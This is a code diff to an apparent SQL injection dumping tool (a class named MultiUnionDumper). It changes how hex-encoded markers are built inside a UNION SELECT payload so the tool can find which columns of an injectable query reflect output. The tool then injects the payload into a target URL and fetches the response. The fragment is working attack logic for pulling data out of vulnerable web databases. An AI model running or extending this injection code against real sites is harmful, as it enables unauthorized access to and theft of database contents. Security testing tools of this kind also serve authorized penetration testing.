@@ -567,9 +567,10 @@ class MultiUnionDumper:
         # Insert unique markers in each column, check which reflect
         for i in range(profile.column_count):
             marker = str(marker_base + i)
+            marker_hex = marker.encode().hex()  # "700042" → "373030303432" (valid hex for ASCII)
             test_nulls = nulls.copy()
-            # Try string marker
-            test_nulls[i] = f"CONCAT(0x{marker},0x{marker})"
+            # Try string marker (proper hex-encoded ASCII so MySQL returns readable string)
+            test_nulls[i] = f"CONCAT(0x{marker_hex},0x{marker_hex})"
             payload = f"{profile.prefix} UNION SELECT {','.join(test_nulls)}{profile.comment}"
             test_url = self._inject(profile, payload)
             body = await self._fetch(test_url, session)
